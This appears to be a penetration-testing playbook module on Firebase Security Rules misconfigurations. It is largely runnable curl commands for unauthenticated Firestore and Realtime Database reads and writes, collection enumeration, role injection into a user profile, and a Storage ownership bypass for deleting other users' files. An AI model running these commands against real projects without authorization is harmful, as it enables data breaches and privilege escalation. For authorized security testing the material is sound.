# VULN MODULE — Firebase Misconfiguration (Firestore + Storage)
# Layer: shared/vuln
# Asset: webapp, mobileapp
# CWE-732 / CWE-284 | Report prefix: WEB-FIREBASE / MOB-FIREBASE
# See also: cloud_misconfig.md (S3, GCS), cors.md (Storage CORS chain)

## THREAT MODEL

Firebase Firestore and Firebase Storage expose REST APIs directly to clients.
Access control is entirely delegated to **Firebase Security Rules** — declarative
server-side rules that developers must write correctly. Common mistakes:

- Granting `read` when only `create` was intended
- Checking authentication (is user logged in?) but not authorization (what role?)
- Trusting client-supplied metadata (`metadata.userId`) for ownership validation
- Overly permissive Storage CORS configuration left from development

**Critical rule:** Always test directly against the Firebase REST API, NOT through
the application's own backend. The app may add validation that the Firebase rules
do not. Any misconfigured rule is exploitable by anyone who calls the API directly.

Both web and mobile apps share the same Firebase backend — a misconfiguration
affects all clients simultaneously.

---

## STEP 1 — IDENTIFY THE FIREBASE PROJECT

### From network traffic / proxy
```bash
# Look for requests to:
*.firebaseio.com        # Realtime Database / Firestore
*.firebaseapp.com       # Hosted app
*.firebasestorage.app   # Storage (new domain)
*.appspot.com           # Storage (legacy domain)
firestore.googleapis.com
```

### From JavaScript bundles (web)
```bash
# Firebase config is embedded in JS — extract projectId and databaseURL:
curl -s https://target.com | grep -oE '"projectId":"[^"]*"'
curl -s https://target.com/static/js/main.*.js | \
  grep -oE '"projectId":"[^"]*"|"databaseURL":"[^"]*"|"storageBucket":"[^"]*"'
```

### From APK/IPA (mobile)
```bash
# Android — check google-services.json and compiled resources
grep -r "firebaseio.com\|firebasestorage\|firebaseapp" ./jadx-output --include="*.java" --include="*.xml"
grep -r "project_id\|storage_bucket\|database_url" ./decompiled/res/ 2>/dev/null

# iOS — check GoogleService-Info.plist
strings target.ipa | grep -i "firebase\|project_id\|storage_bucket"
grep -i "firebaseio\|firebasestorage\|project_id" GoogleService-Info.plist
```

### Google / GitHub dorking
```bash
# Google
site:.firebaseio.com "<target-company>"
(site:.firebasestorage.app OR site:.appspot.com) "<target-company>"

# GitHub code search
"<project-id>" "firebaseio.com"
"<project-id>" "firebasestorage.app"
```

---

## STEP 2 — TEST REALTIME DATABASE (Legacy)

```bash
PROJECT="your-project-id"

# Unauthenticated root read
curl -s "https://${PROJECT}.firebaseio.com/.json"
# Returns data → critical: unauthenticated read of entire database

# Unauthenticated write
curl -s -X PUT "https://${PROJECT}.firebaseio.com/test-bbxyz.json" \
  -d '{"test":true}'
# If 200 → unauthenticated write access

# Check rules (may require auth but worth trying)
curl -s "https://${PROJECT}.firebaseio.com/.settings/rules.json"

# Test specific collections
for col in users admin orders payments messages config settings; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://${PROJECT}.firebaseio.com/${col}.json")
  echo "${col}: ${code}"
done
```

---

## STEP 3 — TEST FIRESTORE REST API

### Base URL pattern
```
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```

### 3a. Unauthenticated read (no token)
```bash
PROJECT="your-project-id"

# List all documents in a collection (unauthenticated)
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/users"
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/orders"
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/admin"

# Enumerate common collection names
for col in users orders admin config products payments messages invoices logs settings \
           contact-form-data newsletter subscribers employees internal; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/${col}")
  echo "${col}: HTTP ${code}"
done
# 200 = readable, 403 = denied, 404 = doesn't exist
```

### 3b. Authenticated read (with user token)
```bash
# Obtain an ID token via Firebase Auth REST API
TOKEN=$(curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@gmail.com","password":"yourpassword","returnSecureToken":true}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['idToken'])")

# Read collections as authenticated user
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/users" \
  -H "Authorization: Bearer ${TOKEN}"

# Try admin/restricted collections
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/admin-mgmt/products" \
  -H "Authorization: Bearer ${TOKEN}"
```

### 3c. Unauthorized create (authentication ≠ authorization)
```bash
# Create document as low-privilege authenticated user
curl -s -X POST \
  "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/admin-mgmt/products" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "fields": {
      "name": {"stringValue": "BB-TEST-PRODUCT"},
      "price": {"doubleValue": 0.01},
      "description": {"stringValue": "Bug bounty test — unauthorized create"},
      "inStock": {"booleanValue": true}
    }
  }'
# 200/201 = unauthorized product creation
```

### 3d. Privilege escalation via profile field injection
```bash
# Write arbitrary fields (including roles) to your own profile
# If the /users/profile rule lacks field validation:
curl -s -X PATCH \
  "https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents/users/profile/${USER_ID}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "fields": {
      "name":  {"stringValue": "BB Test"},
      "email": {"stringValue": "test@test.com"},
      "roles": {
        "arrayValue": {
          "values": [
            {"stringValue": "admin"},
            {"stringValue": "maintainer"}
          ]
        }
      }
    }
  }'
# If 200 → roles injected into your profile
# Now re-test admin-only collections — they may now be accessible
```

### Firestore field type reference
```json
"stringValue":    "text"
"doubleValue":    9999.99
"integerValue":   1
"booleanValue":   true
"timestampValue": "2025-12-31T23:59:59Z"
"arrayValue":     {"values": [{"stringValue": "item"}]}
"mapValue":       {"fields": {"key": {"stringValue": "val"}}}
```

---

## STEP 4 — TEST FIREBASE STORAGE

### 4a. List bucket contents
```bash
# Storage bucket domains:
#   <project-id>.appspot.com           (legacy)
#   <project-id>.firebasestorage.app   (new)

# List bucket (unauthenticated)
curl -s "https://storage.googleapis.com/storage/v1/b/<BUCKET>/o"
curl -s "https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o"

# Download a specific object
curl -s "https://storage.googleapis.com/storage/v1/b/<BUCKET>/o/<OBJECT_PATH>?alt=media"
```

### 4b. Ownership validation bypass (metadata.userId injection)
```bash
# If delete rule checks: resource.metadata.userId == request.auth.uid
# But upload doesn't validate metadata — inject victim's userId during upload

# Step 1: Upload a file claiming to be owned by victim (user ID = victim_uid)
curl -s -X POST \
  "https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o?name=profiles%2Fvictim_uid%2Favatar.jpg" \
  -H "Authorization: Bearer ${YOUR_TOKEN}" \
  -H "Content-Type: image/jpeg" \
  -H "X-Goog-Upload-Protocol: raw" \
  -H "X-Firebase-Storage-Version: Android/1.0" \
  --data-binary @./test.jpg \
  -G -d "metadata=%7B%22userId%22%3A%22victim_uid%22%7D"
  # metadata={"userId":"victim_uid"}

# Step 2: Delete the file — rule checks metadata.userId == your token's uid
# But metadata.userId was set to victim_uid during upload → mismatch
# Conversely: upload with YOUR userId in path owned by victim → delete their file
```

### 4c. CORS misconfiguration check
```bash
# Probe Storage CORS — any origin should be reflected if misconfigured
curl -sI "https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o" \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" | grep -i "access-control"
# Misconfigured: Access-Control-Allow-Origin: * or https://attacker.com
```

---

## VULNERABILITY IMPACT TABLE

| Vulnerability | Severity | Impact |
|---------------|----------|--------|
| Unauthenticated Firestore read — PII collection | Critical | Data breach (users, orders, contacts) |
| Unauthenticated Firestore write | Critical | Data tampering, spam, content injection |
| Authenticated create without authorization | High | Business logic bypass (create products, coupons) |
| Role injection via unvalidated profile fields | Critical | Privilege escalation → admin access |
| Storage ownership validation bypass → delete | High | Unauthorized deletion of other users' files |
| Storage CORS misconfiguration | Medium (escalatable) | Cross-origin data access, chain to higher vulns |
| Unauthenticated Realtime DB read | Critical | Full database exposure |

---

## WHITEBOX GREP PATTERNS

```bash
# Firebase Security Rules files
find . -name "firestore.rules" -o -name "storage.rules" -o -name "database.rules.json" 2>/dev/null

# Check for open rules (allow read, write: if true)
grep -n "allow read\|allow write\|allow create\|allow delete\|allow update" \
  firestore.rules storage.rules 2>/dev/null | grep "if true\|: true"

# Check for auth-only rules (no role/field check)
grep -n "request.auth != null" firestore.rules 2>/dev/null
# Flag any rule that ONLY checks auth without checking role/uid/field

# Firebase config extraction
grep -rn "firebaseio.com\|firebasestorage\|firebaseapp.com\|apiKey\|projectId" \
  --include="*.js" --include="*.ts" --include="*.json" --include="*.env" .

# Storage CORS config
find . -name "cors.json" | xargs grep -l "origin\|method" 2>/dev/null
```

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `*.firebaseio.com` or `*.firebaseapp.com` found in network traffic or JS
- `firestore.googleapis.com` requests detected
- `projectId` + `databaseURL` found in JS bundle or mobile binary
- `google-services.json` or `GoogleService-Info.plist` present in mobile app
- `firestore.rules` or `storage.rules` file found in source
